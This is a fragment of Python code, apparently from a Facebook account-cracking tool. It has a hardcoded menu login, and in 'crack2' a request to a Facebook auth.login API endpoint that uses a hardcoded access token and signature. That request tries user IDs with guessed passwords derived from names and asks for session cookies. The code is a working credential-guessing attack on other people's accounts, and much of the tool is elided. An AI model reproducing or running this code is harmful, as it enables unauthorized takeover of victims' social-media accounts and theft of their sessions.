...
def tech_abm():
    ...
    if username =="Z":
        ...
        if passwordss =="F":
            ...
            print ("\033[1;97m[+]\033[1;92m Password : F\033[1;92m (Correct)")
	    print("\033[1;97m--------------------------------------------------")
            time.sleep(1)
            print('')
...
def crack2():
	...
	print("\033[1;97m--------------------------------------------------")
		...
		try:
		    pass1=name
		    q = requests.get("https://mbaisc.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
